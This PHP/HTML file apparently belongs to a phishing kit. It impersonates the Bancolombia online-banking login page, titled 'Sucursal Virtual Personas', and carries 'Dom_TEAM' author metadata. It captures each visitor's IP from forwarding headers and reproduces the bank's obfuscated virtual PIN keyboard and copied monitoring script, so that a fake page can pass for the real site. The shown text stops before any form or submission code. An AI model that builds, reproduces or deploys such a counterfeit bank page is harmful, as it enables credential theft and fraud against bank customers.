<?php  

function get_real_ip()
    {
 
        if (isset($_SERVER["HTTP_CLIENT_IP"]))
        {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED"]))
        {
            return $_SERVER["HTTP_X_FORWARDED"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED"]))
        {
            return $_SERVER["HTTP_FORWARDED"];
        }
        else
        {
            return $_SERVER["REMOTE_ADDR"];
        }
 
    }
	$ip = get_real_ip();
?>

<html >


<head>
  <title>..::Bancolombia Sucursal Virtual Personas::..</title>
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  <meta charset="ISO-8859-1">
  <meta content="es" http-equiv="Content-Language">
  <meta http-equiv="Expires" content="0">
  <meta http-equiv="Last-Modified" content="0">
  <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="T0d01">
  <meta name="author" content="Dom_TEAM">
  <meta name="Copyright" content="(c) 2014  T0d01 Servic3s. A4ll r1ghts r3s3rv3d.">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">


  
<script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={xpid:"VQcBWVVaABADV1RbDwYCVQ=="};window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){var o=t[e][1][n];return r(o||n)},o,o.exports)}return n[e].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({1:[function(t,n,e){function r(t){try{s.console&&console.log(t)}catch(n){}}var o,i=t("ee"),a=t(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,n,e){r(e.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,n){return t}).join(", ")))},{}],2:[function(t,n,e){function r(t,n,e,r,o){try{d?d-=1:i("err",[o||new UncaughtException(t,n,e)])}catch(s){try{i("ierr",[s,c.now(),!0])}catch(u){}}return"function"==typeof f&&f.apply(this,a(arguments))}function UncaughtException(t,n,e){this.message=t||"Uncaught error with no additional information",this.sourceURL=n,this.line=e}function o(t){i("err",[t,c.now()])}var i=t("handle"),a=t(16),s=t("ee"),c=t("loader"),f=window.onerror,u=!1,d=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(l){"stack"in l&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),u=!0)}s.on("fn-start",function(t,n,e){u&&(d+=1)}),s.on("fn-err",function(t,n,e){u&&(this.thrown=!0,o(e))}),s.on("fn-end",function(){u&&!this.thrown&&d>0&&(d-=1)}),s.on("internal-error",function(t){i("ierr",[t,c.now(),!0])})},{}],3:[function(t,n,e){t("loader").features.ins=!0},{}],4:[function(t,n,e){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,w="fn"+h,v="bstTimer",y="pushState",g=t("loader");g.features.stn=!0,t(6);var b=NREUM.o.EV;o.on(m,function(t,n){var e=t[0];e instanceof b&&(this.bstStart=g.now())}),o.on(w,function(t,n){var e=t[0];e instanceof b&&i("bst",[e,n,this.bstStart,g.now()])}),a.on(m,function(t,n,e){this.bstStart=g.now(),this.bstType=e}),a.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),this.bstType])}),s.on(m,function(){this.bstStart=g.now()}),s.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=g.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,{passive:!0}),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,n,e){function r(t){for(var n=t;n&&!n.hasOwnProperty(u);)n=Object.getPrototypeOf(n);n&&o(n)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,n){return t[1]}var a=t("ee").get("events"),s=t(18)(a,!0),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";n.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,n){var e=t[1],r=c(e,"nr@wrapped",function(){function t(){if("function"==typeof e.handleEvent)return e.handleEvent.apply(e,arguments)}var n={object:t,"function":e}[typeof e];return n?s(n,"fn-",null,n.name||"anonymous"):e});this.wrapped=t[1]=r}),a.on(d+"-start",function(t){t[1]=this.wrapped||t[1]})},{}],6:[function(t,n,e){var r=t("ee").get("history"),o=t(18)(r);n.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,n,e){var r=t("ee").get("raf"),o=t(18)(r),i="equestAnimationFrame";n.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,n,e){function r(t,n,e){t[0]=a(t[0],"fn-",null,e)}function o(t,n,e){this.method=e,this.timerDuration=isNaN(t[1])?0:+t[1],t[0]=a(t[0],"fn-",this,e)}var i=t("ee").get("timer"),a=t(18)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";n.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],9:[function(t,n,e){function r(t,n){d.inPlace(n,["onreadystatechange"],"fn-",s)}function o(){var t=this,n=u.context(t);t.readyState>3&&!n.resolved&&(n.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,y,"fn-",s)}function i(t){g.push(t),h&&(x?x.then(a):w?w(a):(E=-E,O.data=E))}function a(){for(var t=0;t<g.length;t++)r([],g[t]);g.length&&(g=[])}function s(t,n){return n}function c(t,n){for(var e in t)n[e]=t[e];return n}t(5);var f=t("ee"),u=f.get("xhr"),d=t(18)(u),l=NREUM.o,p=l.XHR,h=l.MO,m=l.PR,w=l.SI,v="readystatechange",y=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],g=[];n.exports=u;var b=window.XMLHttpRequest=function(t){var n=new p(t);try{u.emit("new-xhr",[n],n),n.addEventListener(v,o,!1)}catch(e){try{u.emit("internal-error",[e])}catch(r){}}return n};if(c(p,b),b.prototype=p.prototype,d.inPlace(b.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,n){r(t,n),i(n)}),u.on("open-xhr-start",r),h){var x=m&&m.resolve();if(!w&&!m){var E=1,O=document.createTextNode(E);new h(a).observe(O,{characterData:!0})}}else f.on("fn-end",function(t){t[0]&&t[0].type===v||a()})},{}],10:[function(t,n,e){function r(t){var n=this.params,e=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!n.aborted){if(e.duration=a.now()-this.startTime,4===t.readyState){n.status=t.status;var i=o(t,this.lastSize);if(i&&(e.rxSize=i),this.sameOrigin){var c=t.getResponseHeader("X-NewRelic-App-Data");c&&(n.cat=c.split(", ").pop())}}else n.status=0;e.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[n,e,this.startTime])}}}function o(t,n){var e=t.responseType;if("json"===e&&null!==n)return n;var r="arraybuffer"===e||"blob"===e||"json"===e?t.response:t.responseText;return h(r)}function i(t,n){var e=c(n),r=t.params;r.host=e.hostname+":"+e.port,r.pathname=e.pathname,t.sameOrigin=e.sameOrigin}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var n=this;n.totalCbs=0,n.called=0,n.cbTime=0,n.end=r,n.ended=!1,n.xhrGuids={},n.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){n.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,n){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&n.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,n){var e=this.metrics,r=t[0],o=this;if(e&&r){var i=h(r);i&&(e.txSize=i)}this.startTime=a.now(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof n.onload))&&o.end(n)}catch(e){try{f.emit("internal-error",[e])}catch(r){}}};for(var s=0;s<d;s++)n.addEventListener(u[s],this.listener,!1)}),f.on("xhr-cb-time",function(t,n,e){this.cbTime+=t,n?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof e.onload||this.end(e)}),f.on("xhr-load-added",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&!this.xhrGuids[e]&&(this.xhrGuids[e]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&this.xhrGuids[e]&&(delete this.xhrGuids[e],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],n)}),f.on("removeEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],n)}),f.on("fn-start",function(t,n,e){n instanceof m&&("onload"===e&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=a.now()))}),f.on("fn-end",function(t,n){this.xhrCbStart&&f.emit("xhr-cb-time",[a.now()-this.xhrCbStart,this.onload,n],n)})}},{}],11:[function(t,n,e){n.exports=function(t){var n=document.createElement("a"),e=window.location,r={};n.href=t,r.port=n.port;var o=n.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=n.hostname||e.hostname,r.pathname=n.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!n.protocol||":"===n.protocol||n.protocol===e.protocol,a=n.hostname===document.domain&&n.port===e.port;return r.sameOrigin=i&&(!n.hostname||a),r}},{}],12:[function(t,n,e){function r(){}function o(t,n,e){return function(){return i(t,[f.now()].concat(s(arguments)),n?null:this,e),n?void 0:this}}var i=t("handle"),a=t(15),s=t(16),c=t("ee").get("tracer"),f=t("loader"),u=NREUM;"undefined"==typeof window.newrelic&&(newrelic=u);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",p=l+"ixn-";a(d,function(t,n){u[n]=o(l+n,!0,"api")}),u.addPageAction=o(l+"addPageAction",!0),u.setCurrentRouteName=o(l+"routeName",!0),n.exports=newrelic,u.interaction=function(){return(new r).get()};var h=r.prototype={createTracer:function(t,n){var e={},r=this,o="function"==typeof n;return i(p+"tracer",[f.now(),t,e],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],e),o)try{return n.apply(this,arguments)}finally{c.emit("fn-end",[f.now()],e)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,n){h[n]=o(p+n)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,f.now()])}},{}],13:[function(t,n,e){n.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(n){return}}}},{}],14:[function(t,n,e){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),n.exports=r},{}],15:[function(t,n,e){function r(t,n){var e=[],r="",i=0;for(r in t)o.call(t,r)&&(e[i]=n(r,t[r]),i+=1);return e}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],16:[function(t,n,e){function r(t,n,e){n||(n=0),"undefined"==typeof e&&(e=t?t.length:0);for(var r=-1,o=e-n||0,i=Array(o<0?0:o);++r<o;)i[r]=t[n+r];return i}n.exports=r},{}],17:[function(t,n,e){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],18:[function(t,n,e){function r(t){return!(t&&t instanceof Function&&t.apply&&!t[a])}var o=t("ee"),i=t(16),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;n.exports=function(t,n){function e(t,n,e,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof e?e(r,a):e||{}}catch(f){l([f,"",[r,a,o],s])}u(n+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(d){throw u(n+"err",[r,a,d],s),d}finally{u(n+"end",[r,a,c],s)}}return r(t)?t:(n||(n=""),nrWrapper[a]=t,d(t,nrWrapper),nrWrapper)}function f(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)s=n[c],a=t[s],r(a)||(t[s]=e(a,f?s+o:o,i,s))}function u(e,r,o){if(!c||n){var i=c;c=!0;try{t.emit(e,r,o,n)}catch(a){l([a,e,r,o])}c=i}}function d(t,n){if(Object.defineProperty&&Object.keys)try{var e=Object.keys(t);return e.forEach(function(e){Object.defineProperty(n,e,{get:function(){return t[e]},set:function(n){return t[e]=n,n}})}),n}catch(r){l([r])}for(var o in t)s.call(t,o)&&(n[o]=t[o]);return n}function l(n){try{t.emit("internal-error",n)}catch(e){}}return t||(t=o),e.inPlace=f,e.flag=a,e}},{}],ee:[function(t,n,e){function r(){}function o(t){function n(t){return t&&t instanceof r?t:t?c(t,s,i):i()}function e(e,r,o,i){if(!l.aborted||i){t&&t(e,r,o);for(var a=n(o),s=h(e),c=s.length,f=0;f<c;f++)s[f].apply(a,r);var d=u[y[e]];return d&&d.push([g,e,r,a]),a}}function p(t,n){v[t]=h(t).concat(n)}function h(t){return v[t]||[]}function m(t){return d[t]=d[t]||o(e)}function w(t,n){f(t,function(t,e){n=n||"feature",y[e]=n,n in u||(u[n]=[])})}var v={},y={},g={on:p,emit:e,get:m,listeners:h,context:n,buffer:w,abort:a,aborted:!1};return g}function i(){return new r}function a(){(u.api||u.feature)&&(l.aborted=!0,u=l.backlog={})}var s="nr@context",c=t("gos"),f=t(15),u={},d={},l=n.exports=o();l.backlog=u},{}],gos:[function(t,n,e){function r(t,n,e){if(o.call(t,n))return t[n];var r=e();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,n,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[n]=r,r}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(t,n,e){function r(t,n,e,r){o.buffer([t],r),o.emit(t,n,e)}var o=t("ee").get("handle");n.exports=r,r.ee=o},{}],id:[function(t,n,e){function r(t){var n=typeof t;return!t||"object"!==n&&"function"!==n?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");n.exports=r},{}],loader:[function(t,n,e){function r(){if(!x++){var t=b.info=NREUM.info,n=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&n))return u.abort();f(y,function(n,e){t[n]||(t[n]=e)}),c("mark",["onload",a()+b.offset],null,"api");var e=l.createElement("script");e.src="https://"+t.agent,n.parentNode.insertBefore(e,n)}}function o(){"complete"===l.readyState&&i()}function i(){c("mark",["domContent",a()+b.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(s=Math.max((new Date).getTime(),s))-b.offset}var s=(new Date).getTime(),c=t("handle"),f=t(15),u=t("ee"),d=window,l=d.document,p="addEventListener",h="attachEvent",m=d.XMLHttpRequest,w=m&&m.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:m,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1044.min.js"},g=m&&w&&w[p]&&!/CriOS/.test(navigator.userAgent),b=n.exports={offset:s,now:a,origin:v,features:{},xhrWrappable:g};t(12),l[p]?(l[p]("DOMContentLoaded",i,!1),d[p]("load",r,!1)):(l[h]("onreadystatechange",o),d[h]("onload",r)),c("mark",["firstbyte",s],null,"api");var x=0,E=t(17)},{}]},{},["loader",2,10,4,3]);</script><link href="./css/styles.css?v=1.5.3.RC4" media="all" rel="stylesheet" type="text/css">
  <link href="./css/bootstrap.css" media="all" rel="stylesheet" type="text/css">  
  <link href="./css/popover2.css" media="all" rel="stylesheet" type="text/css">  
  
    
      <!--[if lt IE 9]>
      <script src="./js/html5shiv.js"></script>
      <script src="./js/respond.min.js"></script>
   <![endif]-->
	

	<script type="text/javascript" src="./js/jquery-1.10.1.js"></script>
	<script type="text/javascript" src="./js/patterns/jquery.validate-1.11.1.js"></script>
	<script type="text/javascript" src="./js/patterns/validations.js"></script>
	<script type="text/javascript" src="./js/patterns/jquery-validations.js"></script>
	<script type="text/javascript" src="./js/patterns/blockKeys.js"></script>
	
	<script type="text/javascript" src="./js/jquery-ui.js"></script>

	<link href="./css/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
   	<link href="./css/ui.css" media="all" rel="stylesheet" type="text/css">
   

  
	<script language="JavaScript" type="text/javascript" src="./js/keyboard/keyboard.js"></script>
	<script language="JavaScript" type="text/javascript" src="./js/keyboard/layer_lib_util.js"></script>
	<link href="./css/keyboard_util.css" rel="stylesheet" type="text/css">
	



<script language="JavaScript">
function addEventsButton(id_button){
var IE = navigator.appName=="Microsoft Internet Explorer";
if( navigator.userAgent.match( /iPad/i ) ) {
document.getElementById(id_button).addEventListener('touchstart', function(){recoveryPassword();UiWyyUjvjSRk();document.authenticationForm.userId.value = '0';  return JyqeZLLxmVcn();}, false);
}
else if(IE){
document.getElementById(id_button).attachEvent('onclick', function(){recoveryPassword(); csxuHypOysYJ(); document.authenticationForm.userId.value = '0';  return JyqeZLLxmVcn();});
document.getElementById(id_button).attachEvent('onmouseover', function(){UiWyyUjvjSRk();});
document.getElementById(id_button).attachEvent('onmouseout', function(){eUSxfqbtkoWQ();});
}else{
document.getElementById(id_button).addEventListener('click', function(){recoveryPassword(); csxuHypOysYJ(); document.authenticationForm.userId.value = '0';  return JyqeZLLxmVcn();}, false);
document.getElementById(id_button).addEventListener('mouseover', function(){UiWyyUjvjSRk();}, false);
document.getElementById(id_button).addEventListener('mouseout', function(){eUSxfqbtkoWQ();}, false);
}
}
function clearByError(){
if(document.forms[0].userId.value == '' || isEmpty(passwordMinLength[0]) || (passwordMinLength[0] < DEF_MAXLENGTH - 1)){
clearKeys();
document.forms[0].password.value='';
}
}
function validateAndClear(){
var validate = JyqeZLLxmVcn();
if (isNaN(validate) || validate == null || validate == false){
if( navigator.userAgent.match( /iPad/i ) ) {
clearByErrorIpad();
} else {
clearByError();
}
return false;	
}
return true;
}
function clearByErrorIpad(){
document.forms[0].userId.value='';
document.forms[0].password.value='';
document.forms[0].tempUserID.value='';
return true;
}
function addEventsButtonSinCero(id_button){
var IE = navigator.appName=="Microsoft Internet Explorer";
if( navigator.userAgent.match( /iPad/i ) ) {
document.getElementById(id_button).addEventListener('touchstart', function(){recoveryPassword(); UiWyyUjvjSRk(); if(validateAndClear()){validateForm();}}, false);
}
else if(IE){

document.getElementById(id_button).attachEvent('onmouseover', function(){csxuHypOysYJ();});
document.getElementById(id_button).attachEvent('onmouseout', function(){changeToOrigKeyboard();});
}else{

document.getElementById(id_button).addEventListener('mouseover', function(){csxuHypOysYJ();}, false);
document.getElementById(id_button).addEventListener('mouseout', function(){changeToOrigKeyboard();}, false);
}
}
var pXMvUMXWz_Lt = [{'PASS1':'qtjkNFgNZWuM','PASSVERIFICATION1':'RtrXoUKsCXwe','PASSWORD':'uWbVxxfWAZlL'}][0];
function changePass( name ) {
return ( pXMvUMXWz_Lt[name.toUpperCase()] );
}
var passwordMinLength = new Array();
var omitformtags=["input", "textarea", "select"]
omitformtags=omitformtags.join("|")
var maxLengthKeyboard;
var origKeyboardShown = true;
var contrastLevel= "2";
var fontSizeDefault=12;
var indexField = 0;
var isOpen = false;
var isLayer = false;
var KEYCONTENT = '';
var DEF_MAXLENGTH = 4;
var lwyVFRMFuywa = new Array();
var gTJMNIttVzkV = new Array();
var maxLengthKeyboard = DEF_MAXLENGTH;
var regFunction;


function reEnable(){    	return true; }
function blockSelect(element) {   	if (typeof element.onselectstart!="undefined"){      		element.onselectstart=new Function ("event.returnValue=false;  return false; ");    	}else{        		element.onmousedown=disableselect;     		element.onmouseup=reEnable;       	}}
function csxuHypOysYJ(){      for (i=0;i<10;i++){            var mykey = document.getElementById('_yuSgrqfSyZD' + i);   	     mykey.innerHTML='*';      	     mykey.style.fontSize=15; 	     mykey.style.fontWeight='bolder';      }}
function setDefaultCursor(element) {    element.style.cursor = 'default';    }
function wWyNwEIZpnKr(){   	KEYCONTENT = "  <table class='keyboard' border='0' width='150' height='160' cellspacing='0' cellpadding='0' align='left' valign='top'>  <tr>    <td width='0' height='31' ></td>    <td></td>  </tr>  <tr>    <td height='0' width='7'></td>    <td colspan='2'>      <table align='left' valign='top' cellspacing='0' cellpadding='0' class='bg_button'>        <tr align='left'>                  <td valign='top' align='left'> <table class='bg_button' id='_KEYBRD' valign='top' >  <tr><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"7HP\");'>  <div border='0' id ='_yuSgrqfSyZD3' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>3</div></td><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"feM\");'>  <div border='0' id ='_yuSgrqfSyZD1' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>1</div></td><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"kmI\");'>  <div border='0' id ='_yuSgrqfSyZD0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>0</div></td></tr>  <tr><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"WA1\");'>  <div border='0' id ='_yuSgrqfSyZD7' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>7</div></td><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"Y5R\");'>  <div border='0' id ='_yuSgrqfSyZD5' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>5</div></td><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"U2C\");'>  <div border='0' id ='_yuSgrqfSyZD6' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>6</div></td></tr>  <tr><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"8Oi\");'>  <div border='0' id ='_yuSgrqfSyZD2' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>2</div></td><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"d4g\");'>  <div border='0' id ='_yuSgrqfSyZD4' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>4</div></td><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"nGL\");'>  <div border='0' id ='_yuSgrqfSyZD9' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>9</div></td></tr>  <tr><td class='bg_buttonSmall' background='/mua/images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='csxuHypOysYJ();' onmouseout='changeToOrigKeyboard();' onclick='FbzZvuVWByqd(\"0bl\");'>  <div border='0' id ='_yuSgrqfSyZD8' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>8</div></td><td colspan='2' onclick='clearKeys();' class='brr_button'><img src='/mua/images/kb/limpiar.gif'></td></tr></table><table class='bg_button' id='_CONSTRAST' valign='top' cellspacing='0'>  <tr><td><img width='90' height='45' border='0' src='/mua/images/kb/Contraste" + contrastLevel + ".gif' name='constrastImg' id='constrastImg' usemap='#numericKeyboardMap' > <map name='numericKeyboardMap' id='numericKeyboardMap'><area shape='circle' class='cursorContrast' coords='9,30,11' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(1)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' coords='44,30,11' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(2)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' coords='79,30,11' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(3)' onmouseout='setDefaultCursor(document.constrastImg)'></map></td></tr></table></td>        </tr>      </table>    </td>  </tr><tr>    <td height='17'></td>    <td colspan='2'></td>  </tr> </table>";  	return KEYCONTENT;        }
function refreshNumericKeyboard(contrastLevel) {     for(var i=0; i<10; i++) {    var mykey = document.getElementById('_yuSgrqfSyZD' + i);      mykey.style.fontSize=fontSizeDefault;  mykey.className = 'colorContrast'+contrastLevel;  }      }
function changeToOrigKeyboard(){     	for (i=0;i<10;i++){       			var mykey = document.getElementById('_yuSgrqfSyZD' + i);  			mykey.innerHTML=i;  			mykey.style.fontSize=12;         			mykey.style.fontWeight='bolder';      	}     }
function WzzzKXpzWXhU(index) {    	if (index==undefined){        		index=0;       	}    	var form = lwyVFRMFuywa[0].form;   	var vf; 	if (!gTJMNIttVzkV[index]) {     	    var initialLength = form.elements.length;    var vfs='';		for (var i=0; i < initialLength; i++) {   			vf = pXMvUMXWz_Lt[form.elements[i].name.toUpperCase()];    			if (vf) { vfs+='<input type="hidden" name="'+vf+'">' ;            			}		}	}    				document.getElementById('inputs_').innerHTML = ( vfs );	for (ind=0; ind<lwyVFRMFuywa.length; ind++){		vf = pXMvUMXWz_Lt[lwyVFRMFuywa[ind].name.toUpperCase()];      		if(form[vf] == undefined) {  			gTJMNIttVzkV[ind] = "";      		}   		else {     			gTJMNIttVzkV[ind] = form[vf];   		}        		gTJMNIttVzkV[ind].value = "";  	}}
function setHandCursor(element) {      element.style.cursor = 'pointer';    }
function closeKeyb(){   	if (isLayer) activateChild(isOpen = false);       lwyVFRMFuywa[indexField].disabled = false;    }
function FbzZvuVWByqd(keyVal) {        	passwordMinLength[indexField] =lwyVFRMFuywa[indexField].value.length;	if (lwyVFRMFuywa[indexField].value.length < DEF_MAXLENGTH) {       		lwyVFRMFuywa[indexField].value += '*'; 	   	gTJMNIttVzkV[indexField].value += keyVal;       	   	if (regFunction) {      			regFunction();        	}     		if(document.genPassDataForm.tempUserID != undefined) {  			if (document.genPassDataForm.tempUserID.value !== "****************" && document.genPassDataForm.tempUserID.value !== ""){   				document.genPassDataForm.userId.value = document.genPassDataForm.tempUserID.value;    			   	document.genPassDataForm.tempUserID.value = "****************";   			}		} 	}}
function startKeyb(elem, index, modal) {        if (lwyVFRMFuywa[indexField]) {     	      lwyVFRMFuywa[indexField].disabled = false;      }       bindElement(elem);        	WzzzKXpzWXhU(index);           if (!isOpen && isLayer) {    	     activateChild(isOpen = true);         }       if(modal)  {          lwyVFRMFuywa[indexField].disabled = true;         }  }		
function changeConstrastImage(){  var mykey = document.getElementById('constrastImg');    mykey.src='/mua/images/kb/Contraste' + contrastLevel + '.gif'       }		
